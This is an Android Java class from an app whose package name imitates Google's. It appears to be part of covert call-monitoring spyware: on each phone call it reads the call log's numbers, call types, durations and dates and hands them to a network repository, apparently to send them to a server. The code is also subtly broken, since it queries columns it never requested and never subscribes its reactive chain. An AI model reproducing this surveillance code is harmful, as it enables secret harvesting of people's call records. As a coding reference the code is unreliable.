package com.google.android.apps.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.android.apps.App;
import com.google.android.apps.repositories.models.BaseEvent;
import com.google.android.apps.repositories.models.events.Call;
import com.google.android.apps.repositories.network.NetworkRepo;
import com.google.android.apps.utils.Constants;
import com.google.android.apps.utils.DateUtils;
import com.google.android.apps.utils.Preferences;

import java.util.concurrent.TimeUnit;

import io.reactivex.Single;

public class ReceiverOnCall extends BroadcastReceiver {
    private String TAG = ReceiverOnCall.class.getSimpleName();

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.
        NetworkRepo networkRepo = App.getAppComponent().getNetworkRepo();
        Preferences preferences = App.getAppComponent().getPreferences();
        if (!preferences.isCall())
            return;
        if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
            Log.d(TAG, "number" + intent.getExtras().getString("android.intent.extra.PHONE_NUMBER"));
        } else {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            // телефон звонит, получаем входящий номер
            if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                Log.d(TAG,"EXTRA_STATE_RINGING");
            }
            // телефон находится в режиме звонка (набор номера / разговор)
            if ((state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK))) {
                Log.d(TAG,"EXTRA_STATE_OFFHOOK");
            }
            // телефон находится в ждущем режиме (событие наступает по
            // окончании разговора,
            // когда уже знаем номер и факт звонка
            if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                Log.d(TAG,"EXTRA_STATE_IDLE");
                Single.timer(1, TimeUnit.SECONDS)
                        .flatMap(Long -> getCallDetails(context))
                        .doAfterSuccess(networkRepo::addCall);
            }
        }
    }

    private Single<BaseEvent> getCallDetails(Context context) {
//        StringBuffer stringBuffer = new StringBuffer();
//        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
//            Toast.makeText(context, R.string.add_call_log_permission, Toast.LENGTH_SHORT).show();
//            return;
//        }
        Call call = new Call();
        String[] projection = new String[]{CallLog.Calls.NUMBER};
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                projection, null, null, CallLog.Calls.DATE + " DESC");
        if (cursor != null) {
            int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = cursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);

            while (cursor.moveToNext()) {
                call.setNumber(cursor.getString(number));
                // 1 - incoming, 2 - outgoing, 3 - missed
                switch (cursor.getInt(type)) {
                    case 1:
                        call.setType(Constants.INCOMING_CALL);
                        break;
                    case 2:
                        call.setType(Constants.OUTGOING_CALL);
                        break;
                    case 3:
                        call.setType(Constants.MISSED_CALL);
                        break;
                    default:
                        call.setType(Constants.INCOMING_CALL);
                }
                call.setDuration(cursor.getInt(duration));
                call.setDate(DateUtils.convertMilliSecondsToFormattedDate(cursor.getLong(date)));
            }
            cursor.close();
        }
        return Single.just(call);
    }
}
